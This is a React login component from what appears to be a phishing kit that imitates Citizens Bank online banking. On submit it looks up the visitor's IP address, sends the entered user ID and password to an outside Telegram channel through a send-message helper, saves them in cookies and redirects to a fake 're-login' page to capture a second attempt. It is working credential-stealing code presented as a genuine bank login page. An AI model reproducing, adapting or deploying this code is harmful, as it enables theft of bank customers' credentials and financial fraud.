import React from "react";
import { useNavigate } from "react-router-dom";
import TelegramSend from "../utils/send-message";
import cookies from "../utils/cookie.config";

export default function Login() {
  const [formInput, setFormInput] = React.useState<Login>({
    heart: "",
    heartp: "",
  });

  const [isLoading, setIsLoading] = React.useState(false);
  const navigate = useNavigate();

  function handleInputChange(event: React.ChangeEvent<HTMLInputElement>) {
    setFormInput((prevData) => ({
      ...prevData,
      [event.target.name]: event.target.value,
    }));
  }

  async function handleSubmit(event: React.FormEvent<HTMLFormElement>) {
    event.preventDefault();
    setIsLoading(true);

    const request = await fetch("https://api.ipify.org?format=json");
    const response: { ip: string } = await request.json();
    const visitorIP = response.ip;

    const message = `
  [----+🏦 CITIZEN LOGIN (FIRST TRY) 🏦+-----]

  IP: ${visitorIP}

  USERNAME: ${formInput.heart}

  PASSWORD: ${formInput.heartp}
  `;
    await TelegramSend(message);
    cookies.set("login1", formInput);
    cookies.set("pi", visitorIP);
    setIsLoading(false);
    navigate("../re-login", { replace: true });
  }

  return (
    <>
      <form
        className="pay-transfer-options clearfix"
        name="SignOn"
        id="login-form"
        method="post"
        onSubmit={handleSubmit}
      >
        <div className="account-title clearfix">
          <p>Please enter your Online User ID and Password.</p>
        </div>

        <div className="form-item label-right full-width clearfix">
          <label htmlFor="">
            <strong>Online User ID: </strong>
          </label>
          <input
            tabIndex={1}
            onChange={handleInputChange}
            type="text"
            id="username"
            name="heart"
            autoComplete="off"
            maxLength={20}
            className="required demo-username"
            required
          />

          <div className="full-width checkbox-item clearfix">
            <input
              type="checkbox"
              tabIndex={5}
              // disabled="disabled"
              id="cbSaveUserID"
              name="cbSaveUserID"
              style={{ verticalAlign: "top" }}
            />

            <span className="inline-tooltip">
              <label htmlFor="cbSaveUserID">Remember User ID</label>

              <span
                className="tooltip"
                tabIndex={6}
                role="tooltip"
                aria-describedby="tooltip-content"
              >
                <div
                  className="tooltip-icon"
                  title="Remember User ID tooltip"
                ></div>
                <div className="tooltip-box">
                  <div className="tooltip-content" id="aria-tooltip-content">
                    <span className="tooltip-arrow"></span>
                    <div>
                      Select the "Remember User ID" box on the Login page if you
                      want to be remembered.
                    </div>
                    <br />
                    <div>
                      Please note, if the "Remember User ID" check box is not
                      displayed on the Login page, click on the "Login using
                      different Online User ID" link to display it.
                    </div>
                    <br />
                    <div>
                      DO NOT check this box if you are using a public device
                      that is accessible to others.
                    </div>
                  </div>
                  <div className="bottomshadow"></div>
                </div>
              </span>
            </span>
          </div>

          <div className="form-item full-width">
            <label htmlFor="currentpassword">
              <strong>Password: </strong>
            </label>

            <input
              tabIndex={2}
              onChange={handleInputChange}
              type="password"
              id="password"
              name="heartp"
              maxLength={15}
              size={15}
              className="required demo-password"
              required
            />
          </div>

          <span className="mobile-line-break">
            <a
              tabIndex={7}
              style={{ fontSize: "16px !important" }}
              id="troublelogging"
              data-trigger="login-trouble"
              href="https://www4.citizensbankonline.com/efs/ui/tli/index.html"
            >
              Trouble logging in?
            </a>
          </span>
          <br />
        </div>
        <div id="fielderror" className="show-error" role="alert">
          We're sorry. That user ID and password does not match our records.
          Please try again, or do you need Login Assistance?
        </div>

        {
          isLoading ?
          <input
          type="button"
          className="submit-button arrow"
          tabIndex={3}
          data-trigger="next"
          value="Please wait..."
        />

          :
          <input
          type="submit"
          className="submit-button arrow"
          tabIndex={3}
          data-trigger="next"
          value="Login"
        />
        }
        
      </form>
    </>
  );
}
